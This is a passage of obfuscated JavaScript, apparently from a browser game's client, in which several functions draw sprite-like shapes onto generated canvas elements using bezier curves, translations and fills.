			Δ.bezierCurveTo(ᐃ * 47, 130.2946319580078 * ᐃ, 64 * ᐃ, 119.79463195800781 * ᐃ, ᐃ * 64, 118.79463195800781 * ᐃ);
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ΔΔⵠⵠΔ], ⵠᐃΔⲆ * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔⲆⵠ;
			Δ.translate(ⵠⲆᐃⵠ, ᐃ * ⲆⲆᐃΔΔ);
			Δ.save();
			Δ.translate(98 * ᐃ, ᐃ * 99);
			ⵠΔⵠᐃ(Δ, ᐃⲆⲆⲆ, 70.28669492273468 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃᐃⵠ]);
			Δ.save();
			Δ.translate(98 * ᐃ, 99 * ᐃ);
			ⵠΔⵠᐃ(Δ, 6, 56.455940020351264 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.globalAlpha = 1;
			Δ.translate(ⵠⲆᐃⵠ, -ᐃⵠᐃΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 98, 99 * ᐃ);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 70.28669492273468, ⲆⲆᐃΔΔ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃ * ᐃⲆⵠⵠ);
			Δ.save();
			Δ.translate(ᐃ * 98, ᐃ * 99);
			ⵠΔⵠᐃ(Δ, ⲆᐃⲆΔΔ, 56.455940020351264 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⵠⲆⵠ], Ⲇᐃ[Δᐃⵠⵠⵠ], ᐃ * ᐃⵠⲆᐃΔⵠᐃ);
			return Ⲇⵠ
		}

		function ⵠⲆᐃⲆΔᐃᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 450 * ᐃ;
			Ⲇⵠ.height = ᐃ * 790;
			Δ.translate(ⵠⵠᐃⵠ * ᐃ, 5 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? 0 : ⵠᐃⲆᐃ;
			ⵠᐃᐃ(Δ, ᐃ * 178.5, 172.828125 * ᐃ, 150 * ᐃ);
			ΔⲆ(Δ, ⵠⵠΔⵠΔ, Ⲇᐃ[Ⲇᐃⵠⵠ], 65 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 178.5, ᐃ * 172.828125, ᐃ * 150);
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], 55 * ᐃ);
			Δ.closePath();
			Δ.save();
			Δ.translate(ᐃ * 177, ᐃ * 512.328125);
			Ⲇᐃᐃ(Δ, ᐃ * -25, ᐃ * -202.5, ᐃ * 65, ᐃ * 405, ᐃ * 25);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ]);
			Δ.save();
			Δ.translate(136 * ᐃ, ᐃ * 581.828125);
			Ⲇᐃᐃ(Δ, ᐃ * -39, ᐃ * -23, 78 * ᐃ, 46 * ᐃ, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(135.5 * ᐃ, 663.828125 * ᐃ);
			Ⲇᐃᐃ(Δ, -39.5 * ᐃ, -22 * ᐃ, 79 * ᐃ, 44 * ᐃ, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃᐃⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 114, ᐃ * 594.828125);
			Δ.bezierCurveTo(ᐃ * 175, 596.828125 * ᐃ, 163 * ᐃ, 596.828125 * ᐃ, ᐃ * 172, ᐃ * 594.828125);
			Δ.bezierCurveTo(ᐃ * 171.5, 633.828125 * ᐃ, ᐃ * 171.5, ᐃ * 633.828125, ᐃ * 171, 672.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * 673.828125, 140.5 * ᐃ, ᐃ * 673.328125, 110 * ᐃ, 673.828125 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, ᐃ * 661.828125, ᐃ * 110.5, ᐃ * 661.828125, 111 * ᐃ, 649.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 157, 633.828125 * ᐃ, 134 * ᐃ, 607.828125 * ᐃ, 114 * ᐃ, 594.828125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.translate(0, ᐃ * ⲆΔΔᐃ);
			Δ.moveTo(ᐃ * 140, ᐃ * 294.828125);
			Δ.bezierCurveTo(ᐃ * 212, ᐃ * 295.828125, 176.5 * ᐃ, ᐃ * 295.328125, ᐃ * 213, 295.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, 325.328125 * ᐃ, ᐃ * 201.5, ᐃ * 325.328125, ᐃ * 190, ᐃ * 354.828125);
			Δ.bezierCurveTo(175.5 * ᐃ, 355.828125 * ᐃ, ᐃ * 175.5, ᐃ * 355.828125, 161 * ᐃ, ᐃ * 356.828125);
			Δ.bezierCurveTo(ᐃ * 154.5, 328.828125 * ᐃ, ᐃ * 154.5, 328.828125 * ᐃ, ᐃ * 148, ᐃ * 300.828125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.translate(3, -ⵠᐃΔⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 159, 679.828125 * ᐃ);
			Δ.bezierCurveTo(180 * ᐃ, 665.828125 * ᐃ, 155 * ᐃ, ᐃ * 675.828125, 151 * ᐃ, 671.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 154.5, ᐃ * 685.328125, ᐃ * 154.5, 685.328125 * ᐃ, 158 * ᐃ, 698.828125 * ᐃ);
			Δ.bezierCurveTo(171 * ᐃ, 699.828125 * ᐃ, 171 * ᐃ, ᐃ * 699.828125, 184 * ᐃ, ᐃ * 700.828125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(157 * ᐃ, 548.828125 * ᐃ);
			Δ.bezierCurveTo(157 * ᐃ, 561.828125 * ᐃ, ᐃ * 157, 561.828125 * ᐃ, 157 * ᐃ, ᐃ * 574.828125);
			Δ.bezierCurveTo(132.5 * ᐃ, ᐃ * 580.828125, 132.5 * ᐃ, 580.828125 * ᐃ, 108 * ᐃ, ᐃ * 586.828125);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 599.828125, 111 * ᐃ, 593.828125 * ᐃ, ᐃ * 112, 599.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159, 603.828125 * ᐃ, ᐃ * 126.5, 601.328125 * ᐃ, ᐃ * 141, ᐃ * 602.828125);
			Δ.bezierCurveTo(145 * ᐃ, 641.828125 * ᐃ, 143.5 * ᐃ, ᐃ * 623.828125, 146 * ᐃ, 644.828125 * ᐃ);
			Δ.bezierCurveTo(129.5 * ᐃ, 645.328125 * ᐃ, ᐃ * 129.5, ᐃ * 645.328125, 113 * ᐃ, 645.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107.5, ᐃ * 652.828125, ᐃ * 107.5, ᐃ * 652.828125, 102 * ᐃ, ᐃ * 659.828125);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 669.328125, ᐃ * 104, ᐃ * 669.328125, 106 * ᐃ, 678.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, ᐃ * 679.328125, 145 * ᐃ, 679.328125 * ᐃ, ᐃ * 184, 679.828125 * ᐃ);
			Δ.bezierCurveTo(185 * ᐃ, 615.828125 * ᐃ, ᐃ * 185, 615.828125 * ᐃ, 186 * ᐃ, 551.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 172.5, 551.328125 * ᐃ, ᐃ * 172.5, 551.328125 * ᐃ, ᐃ * 159, ᐃ * 550.828125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ], Ⲇᐃ[ΔΔⵠ], ⵠΔᐃⵠⵠ * ᐃ);
			Δ.restore();
			Δ.globalAlpha = ⵠΔΔ;
			Δ.translate(ᐃⲆⵠⵠᐃ * ᐃ, 35 * ᐃ);
			ⵠᐃᐃ(Δ, 178.5 * ᐃ, 172.828125 * ᐃ, 150 * ᐃ);
			ΔⲆ(Δ, ⲆΔⵠⲆⵠ, Ⲇᐃ[2], 95 * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 178.5, ᐃ * 172.828125, ᐃ * 150);
			ΔⲆ(Δ, ΔΔΔⲆΔ, Ⲇᐃ[1], 55 * ᐃ);
			Δ.closePath();
			Δ.save();
			Δ.translate(ᐃ * 177, ᐃ * 512.328125);
			Ⲇᐃᐃ(Δ, ᐃ * -25, ᐃ * -202.5, 65 * ᐃ, 405 * ᐃ, ᐃ * 25);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * 20);
			Δ.save();
			Δ.translate(ᐃ * 136, 581.828125 * ᐃ);
			Ⲇᐃᐃ(Δ, -39 * ᐃ, ᐃ * -23, 78 * ᐃ, 46 * ᐃ, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ΔⵠⵠΔ], ᐃ * ΔⲆᐃᐃᐃⲆⲆ);
			Δ.save();
			Δ.translate(135.5 * ᐃ, 663.828125 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -39.5, -22 * ᐃ, 79 * ᐃ, 44 * ᐃ, 25 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⵠⲆⲆⲆ], ᐃ * ⲆΔⲆⲆΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(114 * ᐃ, 594.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 175, 596.828125 * ᐃ, 163 * ᐃ, ᐃ * 596.828125, ᐃ * 172, 594.828125 * ᐃ);
			Δ.bezierCurveTo(171.5 * ᐃ, 633.828125 * ᐃ, 171.5 * ᐃ, ᐃ * 633.828125, 171 * ᐃ, ᐃ * 672.828125);
			Δ.bezierCurveTo(ᐃ * 110, 673.828125 * ᐃ, 140.5 * ᐃ, ᐃ * 673.328125, ᐃ * 110, 673.828125 * ᐃ);
			Δ.bezierCurveTo(110.5 * ᐃ, ᐃ * 661.828125, ᐃ * 110.5, 661.828125 * ᐃ, 111 * ᐃ, 649.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 157, 633.828125 * ᐃ, ᐃ * 134, ᐃ * 607.828125, 114 * ᐃ, ᐃ * 594.828125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.translate(Δᐃᐃᐃ, ᐃ * ΔᐃΔⲆ);
			Δ.moveTo(ᐃ * 123, 294.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 212, ᐃ * 295.828125, ᐃ * 190.5, 295.328125 * ᐃ, ᐃ * 250, ᐃ * 295.828125);
			Δ.bezierCurveTo(ᐃ * 231.5, 325.328125 * ᐃ, ᐃ * 231.5, ᐃ * 325.328125, ᐃ * 220, ᐃ * 354.828125);
			Δ.bezierCurveTo(175.5 * ᐃ, ᐃ * 355.828125, ᐃ * 175.5, ᐃ * 355.828125, 140 * ᐃ, 356.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123.5, ᐃ * 328.828125, ᐃ * 123.5, 328.828125 * ᐃ, 123 * ᐃ, 294.828125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ]);
			Δ.translate(ⵠᐃⲆᐃ, ᐃ * -ΔᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(ᐃ * 159, ᐃ * 679.828125);
			Δ.bezierCurveTo(180 * ᐃ, 665.828125 * ᐃ, 155 * ᐃ, 675.828125 * ᐃ, 151 * ᐃ, 671.828125 * ᐃ);
			Δ.bezierCurveTo(154.5 * ᐃ, ᐃ * 685.328125, 154.5 * ᐃ, 685.328125 * ᐃ, 158 * ᐃ, ᐃ * 698.828125);
			Δ.bezierCurveTo(171 * ᐃ, ᐃ * 699.828125, ᐃ * 171, ᐃ * 699.828125, 184 * ᐃ, 700.828125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.save();
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(157 * ᐃ, ᐃ * 548.828125);
			Δ.bezierCurveTo(157 * ᐃ, 561.828125 * ᐃ, 157 * ᐃ, 561.828125 * ᐃ, ᐃ * 157, 574.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 132.5, 580.828125 * ᐃ, 132.5 * ᐃ, 580.828125 * ᐃ, ᐃ * 108, ᐃ * 586.828125);
			Δ.bezierCurveTo(112 * ᐃ, 599.828125 * ᐃ, 111 * ᐃ, 593.828125 * ᐃ, ᐃ * 112, 599.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159, 603.828125 * ᐃ, ᐃ * 126.5, ᐃ * 601.328125, ᐃ * 141, 602.828125 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 145, 641.828125 * ᐃ, ᐃ * 143.5, ᐃ * 623.828125, 146 * ᐃ, ᐃ * 644.828125);
			Δ.bezierCurveTo(129.5 * ᐃ, ᐃ * 645.328125, ᐃ * 129.5, ᐃ * 645.328125, ᐃ * 113, 645.828125 * ᐃ);
			Δ.bezierCurveTo(107.5 * ᐃ, ᐃ * 652.828125, ᐃ * 107.5, 652.828125 * ᐃ, 102 * ᐃ, ᐃ * 659.828125);
			Δ.bezierCurveTo(104 * ᐃ, 669.328125 * ᐃ, ᐃ * 104, ᐃ * 669.328125, ᐃ * 106, ᐃ * 678.828125);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 679.328125, 145 * ᐃ, ᐃ * 679.328125, 184 * ᐃ, ᐃ * 679.828125);
			Δ.bezierCurveTo(ᐃ * 185, 615.828125 * ᐃ, 185 * ᐃ, ᐃ * 615.828125, 186 * ᐃ, 551.828125 * ᐃ);
			Δ.bezierCurveTo(172.5 * ᐃ, 551.328125 * ᐃ, 172.5 * ᐃ, 551.328125 * ᐃ, ᐃ * 159, 550.828125 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃᐃⲆΔ], ⵠΔⵠΔⵠΔⵠ * ᐃ);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆⵠⲆⲆⵠᐃⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 202 * ᐃ;
			Ⲇⵠ.height = 202 * ᐃ;
			Δ.translate(2 * ᐃ, ⵠᐃⵠΔ * ᐃ);
			Δ.globalAlpha = .3;
			ⵠᐃᐃ(Δ, 98 * ᐃ, ᐃ * 99, 100 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = .5;
			ⵠᐃᐃ(Δ, 98 * ᐃ, ᐃ * 99, ᐃ * 90);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			return Ⲇⵠ
		}

		function ⵠⲆⵠΔᐃΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 180;
			Ⲇⵠ.height = 120 * ᐃ;
			Δ.translate(-65 * ᐃ, ᐃ * -35);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ⵠᐃⲆᐃ, ᐃ * ⵠᐃⲆⲆΔ);
			Δ.save();
			Δ.translate(150.5 * ᐃ, ᐃ * 63.84375);
			Ⲇᐃᐃ(Δ, ᐃ * -67, -16.5 * ᐃ, ᐃ * 134, ᐃ * 33, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(80.5 * ᐃ, ᐃ * 75.34375);
			Δ.bezierCurveTo(83 * ᐃ, 106.34375 * ᐃ, ᐃ * 83, 106.34375 * ᐃ, ᐃ * 85.5, ᐃ * 137.34375);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 135.84375, ᐃ * 93, ᐃ * 135.84375, 100.5 * ᐃ, ᐃ * 134.34375);
			Δ.bezierCurveTo(ᐃ * 99.5, 100.84375 * ᐃ, ᐃ * 99.5, ᐃ * 100.84375, ᐃ * 98.5, 67.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(206.5 * ᐃ, ᐃ * 71.34375);
			Δ.bezierCurveTo(203.5 * ᐃ, ᐃ * 104.34375, ᐃ * 203.5, ᐃ * 104.34375, 200.5 * ᐃ, 137.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.5, ᐃ * 137.34375, 208.5 * ᐃ, ᐃ * 137.34375, ᐃ * 216.5, 137.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219, ᐃ * 102.84375, 219 * ᐃ, ᐃ * 102.84375, ᐃ * 221.5, 68.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 136.5, ᐃ * 75.34375);
			Δ.bezierCurveTo(139 * ᐃ, 94.34375 * ᐃ, 139 * ᐃ, ᐃ * 94.34375, ᐃ * 141.5, ᐃ * 113.34375);
			Δ.bezierCurveTo(ᐃ * 149.5, 115.34375 * ᐃ, ᐃ * 149.5, ᐃ * 115.34375, ᐃ * 157.5, 117.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 162, ᐃ * 97.34375, 162 * ᐃ, ᐃ * 97.34375, ᐃ * 166.5, ᐃ * 77.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(ᐃ * 152.5, 80.84375 * ᐃ);
			Δ.rotate(3.12);
			Ⲇᐃᐃ(Δ, ᐃ * -73, ᐃ * -20.5, 146 * ᐃ, 41 * ᐃ, ᐃ * 5);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.globalAlpha = 1;
			Δ.translate(0, -10 * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 150.5, ᐃ * 63.84375);
			Ⲇᐃᐃ(Δ, -67 * ᐃ, ᐃ * -16.5, 134 * ᐃ, ᐃ * 33, ᐃ * ᐃⲆⵠⵠ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⵠⲆⲆⲆ], 4 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 80.5, ᐃ * 75.34375);
			Δ.bezierCurveTo(83 * ᐃ, 106.34375 * ᐃ, 83 * ᐃ, ᐃ * 106.34375, 85.5 * ᐃ, ᐃ * 137.34375);
			Δ.bezierCurveTo(ᐃ * 93, 135.84375 * ᐃ, ᐃ * 93, ᐃ * 135.84375, 100.5 * ᐃ, ᐃ * 134.34375);
			Δ.bezierCurveTo(ᐃ * 99.5, ᐃ * 100.84375, 99.5 * ᐃ, ᐃ * 100.84375, ᐃ * 98.5, 67.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * ΔⲆᐃⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 206.5, 71.34375 * ᐃ);
			Δ.bezierCurveTo(203.5 * ᐃ, 104.34375 * ᐃ, ᐃ * 203.5, 104.34375 * ᐃ, 200.5 * ᐃ, 137.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 208.5, 137.34375 * ᐃ, ᐃ * 208.5, ᐃ * 137.34375, ᐃ * 216.5, 137.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219, 102.84375 * ᐃ, ᐃ * 219, ᐃ * 102.84375, 221.5 * ᐃ, ᐃ * 68.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ], Ⲇᐃ[2], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 136.5, 75.34375 * ᐃ);
			Δ.bezierCurveTo(139 * ᐃ, 94.34375 * ᐃ, ᐃ * 139, 94.34375 * ᐃ, ᐃ * 141.5, 113.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149.5, 115.34375 * ᐃ, ᐃ * 149.5, 115.34375 * ᐃ, 157.5 * ᐃ, ᐃ * 117.34375);
			Δ.bezierCurveTo(162 * ᐃ, ᐃ * 97.34375, 162 * ᐃ, ᐃ * 97.34375, 166.5 * ᐃ, ᐃ * 77.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ΔⲆᐃⵠᐃ);
			Δ.save();
			Δ.translate(152.5 * ᐃ, 80.84375 * ᐃ);
			Δ.rotate(3.12);
			Ⲇᐃᐃ(Δ, ᐃ * -73, ᐃ * -20.5, 146 * ᐃ, 41 * ᐃ, 5 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[ⵠΔⲆᐃ], ᐃ * 4);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(83.5 * ᐃ, 73.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93.5, 70.34375 * ᐃ, 105.5 * ᐃ, ᐃ * 70.34375, 124.5 * ᐃ, ᐃ * 72.34375);
			Δ.bezierCurveTo(ᐃ * 132.5, ᐃ * 78.34375, 162.5 * ᐃ, 80.34375 * ᐃ, ᐃ * 176.5, 76.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 194.5, 69.34375 * ᐃ, 192.5 * ᐃ, 68.34375 * ᐃ, ᐃ * 199.5, 63.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 204.5, ᐃ * 63.34375, 204.5 * ᐃ, 63.34375 * ᐃ, 209.5 * ᐃ, ᐃ * 63.34375);
			Δ.bezierCurveTo(153.5 * ᐃ, ᐃ * 82.34375, ᐃ * 157.5, ᐃ * 85.34375, 209.5 * ᐃ, ᐃ * 63.34375);
			Δ.bezierCurveTo(194.5 * ᐃ, 88.34375 * ᐃ, ᐃ * 162.5, ᐃ * 87.34375, ᐃ * 149.5, 88.34375 * ᐃ);
			Δ.bezierCurveTo(129.5 * ᐃ, ᐃ * 81.34375, 103.5 * ᐃ, ᐃ * 75.34375, ᐃ * 83.5, ᐃ * 82.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 137.5, 65.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 150.5, 76.34375 * ᐃ, 170.5 * ᐃ, 71.34375 * ᐃ, ᐃ * 174.5, 65.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(221.5 * ᐃ, ᐃ * 85.34375);
			Δ.bezierCurveTo(ᐃ * 211.5, ᐃ * 79.34375, 191.5 * ᐃ, 88.34375 * ᐃ, 181.5 * ᐃ, 96.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, ᐃ * 96.34375, ᐃ * 201.5, ᐃ * 96.34375, ᐃ * 221.5, ᐃ * 96.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(84.5 * ᐃ, 89.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102.5, ᐃ * 87.34375, ᐃ * 112.5, 88.34375 * ᐃ, 119.5 * ᐃ, 97.34375 * ᐃ);
			Δ.bezierCurveTo(102 * ᐃ, ᐃ * 98.34375, ᐃ * 102, ᐃ * 98.34375, ᐃ * 84.5, 99.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 208.5, 104.34375 * ᐃ);
			Δ.bezierCurveTo(208.5 * ᐃ, 110.34375 * ᐃ, ᐃ * 208.5, ᐃ * 110.34375, ᐃ * 208.5, ᐃ * 116.34375);
			Δ.bezierCurveTo(ᐃ * 211.5, ᐃ * 110.34375, ᐃ * 211.5, ᐃ * 110.34375, 214.5 * ᐃ, 104.34375 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(87.5 * ᐃ, ᐃ * 117.34375);
			Δ.bezierCurveTo(ᐃ * 92, 118.84375 * ᐃ, 92 * ᐃ, 118.84375 * ᐃ, 96.5 * ᐃ, 120.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93, 123.84375 * ᐃ, 93 * ᐃ, 123.84375 * ᐃ, 89.5 * ᐃ, ᐃ * 127.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 107.5, ᐃ * 51.34375);
			Δ.bezierCurveTo(122.5 * ᐃ, ᐃ * 54.34375, 122.5 * ᐃ, ᐃ * 54.34375, ᐃ * 137.5, 57.34375 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118, 57.34375 * ᐃ, 118 * ᐃ, ᐃ * 57.34375, 98.5 * ᐃ, ᐃ * 57.34375);
			Δ.bezierCurveTo(94.5 * ᐃ, ᐃ * 54.84375, ᐃ * 94.5, 54.84375 * ᐃ, 90.5 * ᐃ, ᐃ * 52.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 170.5, ᐃ * 52.34375);
			Δ.bezierCurveTo(ᐃ * 179.5, 51.84375 * ᐃ, 179.5 * ᐃ, 51.84375 * ᐃ, ᐃ * 188.5, ᐃ * 51.34375);
			Δ.bezierCurveTo(187.5 * ᐃ, ᐃ * 53.84375, ᐃ * 187.5, ᐃ * 53.84375, 186.5 * ᐃ, 56.34375 * ᐃ);
			Δ.bezierCurveTo(177 * ᐃ, 56.34375 * ᐃ, 177 * ᐃ, 56.34375 * ᐃ, 167.5 * ᐃ, ᐃ * 56.34375);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(80.5 * ᐃ, ᐃ * 69.34375);
